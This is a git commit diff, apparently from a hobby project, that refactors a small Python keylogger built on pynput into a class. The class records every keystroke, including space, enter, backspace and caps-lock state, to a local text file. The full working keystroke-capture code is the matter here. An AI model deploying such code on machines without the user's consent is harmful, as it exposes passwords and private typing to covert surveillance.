001b58e0372b7fb6f6639932efec34974afc8011
Diego <diego.eaguillon@gmail.com>
2024-05-25 17:23:43 -0500

    Improved program

--- Key Logger.py
+++ Key Logger.py
@@ -1,18 +1,33 @@
 from pynput import keyboard
 
-def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt", 'a') as logkey:
-        try:
-            char = key.char
-            logkey.write(char)
-        except:
-            print("Error getting char")
+class Keylogger:
+
+    def __init__(self):
+        self.caps = False
+
+    def keyPressed(self, key):
+        with open("keyfile.txt", 'a') as logkey:
+            try:
+                char = key.char
+                print(str(key))
+                if self.caps == True:
+                    char = char.upper()
+                logkey.write(char)
+            except:
+                if key == keyboard.Key.space:
+                    logkey.write(' ')
+                elif key == keyboard.Key.enter:
+                    logkey.write('\n')
+                elif key == keyboard.Key.backspace:
+                    logkey.write('\b')
+                elif key == keyboard.Key.caps_lock:
+                    if self.caps == False:
+                        self.caps = True
+                    else:
+                        self.caps = False
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press = keyPressed)
+    logger = Keylogger()
+    listener = keyboard.Listener(on_press = logger.keyPressed)
     listener.start()
     input()
-
-#hello world
-#chicken
